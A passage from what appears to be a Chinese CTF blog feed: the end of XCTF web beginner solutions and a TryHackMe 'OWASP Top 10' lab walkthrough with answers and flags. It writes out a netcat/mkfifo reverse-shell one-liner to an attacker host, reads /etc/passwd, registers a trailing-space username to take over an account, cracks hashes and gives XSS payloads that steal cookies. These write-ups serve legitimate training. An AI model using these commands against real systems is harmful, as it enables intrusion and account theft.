href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>计算机暂时或永久保存的信息。</p><p>查看cookie发现新的页面cookie.php</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213433256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>进入后提示我们查看http返回包，找到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213451447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>5、disabled_button</p><p>flag按钮点不了，查看源码将disabled删掉，点击按钮出现flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213525867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>6、weak_auth</p><p>访问看到一个登录页面，输入一个账号密码，看到弹窗，登录失败。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213539700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>查看源码发现提示，需要一个字典，那应该是肉口令爆破。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213555107.png#pic_center" alt=""></p><p>进行口令猜测得账号密码：admin/123456,登录到后台得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213613869.png#pic_center" alt=""></p><p>7、simple_php</p><p>从源码中看，get方式获得两个数据a,b，a不能为空且值要为0，b是否是数字或者字符串。a为弱类型比较，弱类型只需要值相比较，b在大于1234的数后面加一个字符便可以绕过。</p><pre><code>?a='0'&amp;b=12345a</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213645245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>8、get_post</p><p>考察GET、POST的使用</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213703741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>9、xff_referer</p><p>用burp抓包</p><p>第一关：修改IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213738406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>第二关：修改来源站点</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213821265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>拿到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213839128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>10、webshell</p><p>考察php一句话的用法，用命令查看该目录下的所有文件。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213859910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>11、command_execution</p><p>命令执行找到flag的位置，再读取flag。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213919400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110221393696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>12、simple_js</p><p>弹窗输入密码错误查看源码</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213958962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>写脚本将16进制解码</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102214015790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> XCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tryhackme--OWASP Top 10</title>
      <link href="/posts/75a2a2a8.html"/>
      <url>/posts/75a2a2a8.html</url>
      
        <content type="html"><![CDATA[<p>前面四个Task直接点完成即可，都是一些介绍<br>直接访问题目说的： <a href="http://10.10.141.123/evilshell.php页面，是一个命令执行的页面。" target="_blank" rel="noopener">http://10.10.141.123/evilshell.php页面，是一个命令执行的页面。</a><br>先反弹一个shell，要不然操作不方便</p><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.xx.xx 4444 &gt;/tmp/f  #服务器nc -lvp 4444   #攻击机</code></pre><h1 id="Task-5-Severity-1-Command-Injection-Practical"><a href="#Task-5-Severity-1-Command-Injection-Practical" class="headerlink" title="Task 5  [Severity 1] Command Injection Practical"></a>Task 5  [Severity 1] Command Injection Practical</h1><p>发现Task5的问题和上一篇博文是一模一样的，那我们就来简单复习一下</p><h2 id="What-strange-text-file-is-in-the-website-root-directory"><a href="#What-strange-text-file-is-in-the-website-root-directory" class="headerlink" title="What strange text file is in the website root directory?"></a>What strange text file is in the website root directory?</h2><pre><code>ls -aldrpepper.txt</code></pre><h2 id="How-many-non-root-non-service-non-daemon-users-are-there"><a href="#How-many-non-root-non-service-non-daemon-users-are-there" class="headerlink" title="How many non-root/non-service/non-daemon users are there?"></a>How many non-root/non-service/non-daemon users are there?<a id="more"></a></h2><pre><code>cat /etc/passwd | grep /bin/bash0</code></pre><h2 id="What-user-is-this-app-running-as"><a href="#What-user-is-this-app-running-as" class="headerlink" title="What user is this app running as?"></a>What user is this app running as?</h2><pre><code>idwww-data</code></pre><h2 id="What-is-the-user’s-shell-set-as"><a href="#What-is-the-user’s-shell-set-as" class="headerlink" title="What is the user’s shell set as?"></a>What is the user’s shell set as?</h2><pre><code>echo $SHELL/usr/sbin/nologin</code></pre><h2 id="What-version-of-Ubuntu-is-running"><a href="#What-version-of-Ubuntu-is-running" class="headerlink" title="What version of Ubuntu is running?"></a>What version of Ubuntu is running?</h2><pre><code>cat /etc/issue18.04.4 </code></pre><h2 id="Print-out-the-MOTD-What-favorite-beverage-is-shown"><a href="#Print-out-the-MOTD-What-favorite-beverage-is-shown" class="headerlink" title="Print out the MOTD.  What favorite beverage is shown?"></a>Print out the MOTD.  What favorite beverage is shown?</h2><pre><code>cat drpepper.txtDr Pepper</code></pre><h1 id="Task-7-Severity-2-Broken-Authentication-Practical"><a href="#Task-7-Severity-2-Broken-Authentication-Practical" class="headerlink" title="Task 7  [Severity 2] Broken Authentication Practical"></a>Task 7  [Severity 2] Broken Authentication Practical</h1><h2 id="What-is-the-flag-that-you-found-in-darren’s-account"><a href="#What-is-the-flag-that-you-found-in-darren’s-account" class="headerlink" title="What is the flag that you found in darren’s account?"></a>What is the flag that you found in darren’s account?</h2><p>重新注册一个现有用户：darren ，注意darren后面跟一个空格！！！密码，邮箱任意填，darren 用户虽然是一个新用户但是他却和darren有同等的权限，用注册号的darren 登录<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112115033903.png#pic_center" alt=""></p><pre><code>fe86079416a21a3c99937fea8874b667</code></pre><h2 id="What-is-the-flag-that-you-found-in-arthur’s-account"><a href="#What-is-the-flag-that-you-found-in-arthur’s-account" class="headerlink" title="What is the flag that you found in arthur’s account?"></a>What is the flag that you found in arthur’s account?</h2><p>arthur用户也一样的方法<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112115405874.png#pic_center" alt=""></p><pre><code>d9ac0f7db4fda460ac3edeb75d75e16e</code></pre><h1 id="Task-11-Severity-3-Sensitive-Data-Exposure-Challenge"><a href="#Task-11-Severity-3-Sensitive-Data-Exposure-Challenge" class="headerlink" title="Task 11  [Severity 3] Sensitive Data Exposure (Challenge)"></a>Task 11  [Severity 3] Sensitive Data Exposure (Challenge)</h1><h2 id="What-is-the-name-of-the-mentioned-directory"><a href="#What-is-the-name-of-the-mentioned-directory" class="headerlink" title="What is the name of the mentioned directory?"></a>What is the name of the mentioned directory?</h2><p>日常扫目录<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112124136483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>/assets</code></pre><h2 id="Navigate-to-the-directory-you-found-in-question-one-What-file-stands-out-as-being-likely-to-contain-sensitive-data"><a href="#Navigate-to-the-directory-you-found-in-question-one-What-file-stands-out-as-being-likely-to-contain-sensitive-data" class="headerlink" title="Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?"></a>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?</h2><p>访问发现网站数据库<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112124305139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>webapp.db</code></pre><h2 id="Use-the-supporting-material-to-access-the-sensitive-data-What-is-the-password-hash-of-the-admin-user"><a href="#Use-the-supporting-material-to-access-the-sensitive-data-What-is-the-password-hash-of-the-admin-user" class="headerlink" title="Use the supporting material to access the sensitive data. What is the password hash of the admin user?"></a>Use the supporting material to access the sensitive data. What is the password hash of the admin user?</h2><p>下载打开数据库并访问，发现三个用户及其hash值<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112124452606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>6eea9b7ef19179a06954edd0f6c05ceb</code></pre><h2 id="Crack-the-hash-What-is-the-admin’s-plaintext-password"><a href="#Crack-the-hash-What-is-the-admin’s-plaintext-password" class="headerlink" title="Crack the hash.What is the admin’s plaintext password?"></a>Crack the hash.What is the admin’s plaintext password?</h2><p>把hash值拿去md5解密<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112124638581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>qwertyuiop</code></pre><h2 id="Login-as-the-admin-What-is-the-flag"><a href="#Login-as-the-admin-What-is-the-flag" class="headerlink" title="Login as the admin. What is the flag?"></a>Login as the admin. What is the flag?</h2><p>用破解得到的密码和账号登录,后台地址前面扫目录也已经扫到了</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112124916407.png#pic_center" alt=""></p><pre><code> THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</code></pre><h1 id="Task-13-Severity-4-XML-External-Entity-eXtensible-Markup-Language"><a href="#Task-13-Severity-4-XML-External-Entity-eXtensible-Markup-Language" class="headerlink" title="Task 13  [Severity 4 XML External Entity - eXtensible Markup Language"></a>Task 13  [Severity 4 XML External Entity - eXtensible Markup Language</h1><p>大多答案在问题中都有</p><h2 id="Full-form-of-XML"><a href="#Full-form-of-XML" class="headerlink" title="Full form of XML"></a>Full form of XML</h2><pre><code>eXtensible Markup Language</code></pre><h2 id="Is-it-compulsory-to-have-XML-prolog-in-XML-documents"><a href="#Is-it-compulsory-to-have-XML-prolog-in-XML-documents" class="headerlink" title="Is it compulsory to have XML prolog in XML documents?"></a>Is it compulsory to have XML prolog in XML documents?</h2><pre><code>no</code></pre><h2 id="Can-we-validate-XML-documents-against-a-schema"><a href="#Can-we-validate-XML-documents-against-a-schema" class="headerlink" title="Can we validate XML documents against a schema?"></a>Can we validate XML documents against a schema?</h2><pre><code>yes</code></pre><h2 id="How-can-we-specify-XML-version-and-encoding-in-XML-document"><a href="#How-can-we-specify-XML-version-and-encoding-in-XML-document" class="headerlink" title="How can we specify XML version and encoding in XML document?"></a>How can we specify XML version and encoding in XML document?</h2><pre><code> XML prolog</code></pre><h1 id="Task-14-Severity-4-XML-External-Entity-DTD"><a href="#Task-14-Severity-4-XML-External-Entity-DTD" class="headerlink" title="Task 14  [Severity 4] XML External Entity - DTD"></a>Task 14  [Severity 4] XML External Entity - DTD</h1><h2 id="How-do-you-define-a-new-ELEMENT"><a href="#How-do-you-define-a-new-ELEMENT" class="headerlink" title="How do you define a new ELEMENT?"></a>How do you define a new ELEMENT?</h2><pre><code>!ELEMENT</code></pre><h2 id="How-do-you-define-a-ROOT-element"><a href="#How-do-you-define-a-ROOT-element" class="headerlink" title="How do you define a ROOT element?"></a>How do you define a ROOT element?</h2><pre><code>!DOCTYPE</code></pre><h2 id="How-do-you-define-a-new-ENTITY"><a href="#How-do-you-define-a-new-ENTITY" class="headerlink" title="How do you define a new ENTITY?"></a>How do you define a new ENTITY?</h2><pre><code>!ENTITY</code></pre><h1 id="Task-16-Severity-4-XML-External-Entity-Exploiting"><a href="#Task-16-Severity-4-XML-External-Entity-Exploiting" class="headerlink" title="Task 16  [Severity 4] XML External Entity - Exploiting"></a>Task 16  [Severity 4] XML External Entity - Exploiting</h1><p>抓包，制作XML阅读文件的payload<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112130804705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="Where-is-falcon’s-SSH-key-located"><a href="#Where-is-falcon’s-SSH-key-located" class="headerlink" title="Where is falcon’s SSH key located?"></a>Where is falcon’s SSH key located?</h2><p>常识<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112131103161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="What-are-the-first-18-characters-for-falcon’s-private-key"><a href="#What-are-the-first-18-characters-for-falcon’s-private-key" class="headerlink" title="What are the first 18 characters for falcon’s private key"></a>What are the first 18 characters for falcon’s private key</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112131454623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>MIIEogIBAAKCAQEA7b</code></pre><h1 id="Task-18-Severity-5-Broken-Access-Control-IDOR-Challenge"><a href="#Task-18-Severity-5-Broken-Access-Control-IDOR-Challenge" class="headerlink" title="Task 18  [Severity 5] Broken Access Control (IDOR Challenge)"></a>Task 18  [Severity 5] Broken Access Control (IDOR Challenge)</h1><p>越权的题型</p><h2 id="Look-at-other-users-notes-What-is-the-flag"><a href="#Look-at-other-users-notes-What-is-the-flag" class="headerlink" title="Look at other users notes. What is the flag?"></a>Look at other users notes. What is the flag?</h2><p>抓包爆破<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112161830661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>flag{fivefourthree} </code></pre><h1 id="Task-19-Severity-6-Security-Misconfiguration"><a href="#Task-19-Severity-6-Security-Misconfiguration" class="headerlink" title="Task 19  [Severity 6] Security Misconfiguration"></a>Task 19  [Severity 6] Security Misconfiguration</h1><h2 id="Hack-into-the-webapp-and-find-the-flag"><a href="#Hack-into-the-webapp-and-find-the-flag" class="headerlink" title="Hack into the webapp, and find the flag!"></a>Hack into the webapp, and find the flag!</h2><p>访问看到，考默认口令的<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112163426570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>谷歌一下Pensive Notes<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112163535825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112163559393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>登录得到<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112163648227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>thm{4b9513968fd564a87b28aa1f9d672e17}</code></pre><h1 id="Task-20-Severity-7-Cross-site-Scripting"><a href="#Task-20-Severity-7-Cross-site-Scripting" class="headerlink" title="Task 20  [Severity 7] Cross-site Scripting"></a>Task 20  [Severity 7] Cross-site Scripting</h1><h2 id="Navigate-to-http-10-10-150-152-in-your-browser-and-click-on-the-“Reflected-XSS”-tab-on-the-navbar-craft-a-reflected-XSS-payload-that-will-cause-a-popup-saying-“Hello”"><a href="#Navigate-to-http-10-10-150-152-in-your-browser-and-click-on-the-“Reflected-XSS”-tab-on-the-navbar-craft-a-reflected-XSS-payload-that-will-cause-a-popup-saying-“Hello”" class="headerlink" title="Navigate to http://10.10.150.152/ in your browser and click on the “Reflected XSS” tab on the navbar; craft a reflected XSS payload that will cause a popup saying “Hello”."></a>Navigate to <a href="http://10.10.150.152/" target="_blank" rel="noopener">http://10.10.150.152/</a> in your browser and click on the “Reflected XSS” tab on the navbar; craft a reflected XSS payload that will cause a popup saying “Hello”.</h2><p>payload:</p><pre><code>&lt;script&gt;alert('Hello')&lt;/script&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112164652806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>ThereIsMoreToXSSThanYouThink</code></pre><h2 id="On-the-same-reflective-page-craft-a-reflected-XSS-payload-that-will-cause-a-popup-with-your-machines-IP-address"><a href="#On-the-same-reflective-page-craft-a-reflected-XSS-payload-that-will-cause-a-popup-with-your-machines-IP-address" class="headerlink" title="On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address."></a>On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.</h2><p>payload:</p><pre><code>&lt;script&gt;alert(window.location.host)&lt;/script&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112164852947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>ReflectiveXss4TheWin</code></pre><h2 id="Now-navigate-to-http-10-10-135-248-stored-in-your-browser-and-make-an-account-Then-add-a-comment-and-see-if-you-can-insert-some-of-your-own-HTML"><a href="#Now-navigate-to-http-10-10-135-248-stored-in-your-browser-and-make-an-account-Then-add-a-comment-and-see-if-you-can-insert-some-of-your-own-HTML" class="headerlink" title="Now navigate to http://10.10.135.248/stored in your browser and make an account.Then add a comment and see if you can insert some of your own HTML."></a>Now navigate to <a href="http://10.10.135.248/stored" target="_blank" rel="noopener">http://10.10.135.248/stored</a> in your browser and make an account.Then add a comment and see if you can insert some of your own HTML.</h2><p>注册一个账号在Stored XSS处提交一段HTML代码</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112170216462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>HTML_T4gs</code></pre><p>以下两个本人因为环境问题没用复现成功，payload没错，读者可自行拿去实验</p><h2 id="On-the-same-page-create-an-alert-popup-box-appear-on-the-page-with-your-document-cookies"><a href="#On-the-same-page-create-an-alert-popup-box-appear-on-the-page-with-your-document-cookies" class="headerlink" title="On the same page, create an alert popup box appear on the page with your document cookies."></a>On the same page, create an alert popup box appear on the page with your document cookies.</h2><p>payload:</p><pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><h2 id="Change-“XSS-Playground”-to-“I-am-a-hacker”-by-adding-a-comment-and-using-Javascript"><a href="#Change-“XSS-Playground”-to-“I-am-a-hacker”-by-adding-a-comment-and-using-Javascript" class="headerlink" title="Change “XSS Playground” to “I am a hacker” by adding a comment and using Javascript."></a>Change “XSS Playground” to “I am a hacker” by adding a comment and using Javascript.</h2><p>Payload: </p><pre><code>document.querySelector('#thm-title').textContent = 'I am a hacker'</code></pre><h1 id="Task-21-Severity-8-Insecure-Deserialization"><a href="#Task-21-Severity-8-Insecure-Deserialization" class="headerlink" title="Task 21  [Severity 8] Insecure Deserialization"></a>Task 21  [Severity 8] Insecure Deserialization</h1><h2 id="Who-developed-the-Tomcat-application"><a href="#Who-developed-the-Tomcat-application" class="headerlink" title="Who developed the Tomcat application?"></a>Who developed the Tomcat application?</h2><pre><code>Apache Software Foundation</code></pre><h2 id="What-type-of-attack-that-crashes-services-can-be-performed-with-insecure-deserialization"><a href="#What-type-of-attack-that-crashes-services-can-be-performed-with-insecure-deserialization" class="headerlink" title="What type of attack that crashes services can be performed with insecure deserialization?"></a>What type of attack that crashes services can be performed with insecure deserialization?</h2><pre><code>Denial of Service</code></pre><h1 id="Task-22-Severity-8-Insecure-Deserialization-Objects"><a href="#Task-22-Severity-8-Insecure-Deserialization-Objects" class="headerlink" title="Task 22  [Severity 8] Insecure Deserialization - Objects"></a>Task 22  [Severity 8] Insecure Deserialization - Objects</h1><h2 id="if-a-dog-was-sleeping-would-this-be"><a href="#if-a-dog-was-sleeping-would-this-be" class="headerlink" title="if a dog was sleeping, would this be:"></a>if a dog was sleeping, would this be:</h2><p>A) A State<br>B) A Behaviour </p><pre><code>A Behaviour </code></pre><h1 id="Task-23-Severity-8-Insecure-Deserialization-Deserialization"><a href="#Task-23-Severity-8-Insecure-Deserialization-Deserialization" class="headerlink" title="Task 23  [Severity 8] Insecure Deserialization - Deserialization"></a>Task 23  [Severity 8] Insecure Deserialization - Deserialization</h1><h2 id="What-is-the-name-of-the-base-2-formatting-that-data-is-sent-across-a-network-as"><a href="#What-is-the-name-of-the-base-2-formatting-that-data-is-sent-across-a-network-as" class="headerlink" title="What is the name of the base-2 formatting that data is sent across a network as?"></a>What is the name of the base-2 formatting that data is sent across a network as?</h2><pre><code>binary</code></pre><h1 id="Task-24-Severity-8-Insecure-Deserialization-Cookies"><a href="#Task-24-Severity-8-Insecure-Deserialization-Cookies" class="headerlink" title="Task 24  [Severity 8] Insecure Deserialization - Cookies"></a>Task 24  [Severity 8] Insecure 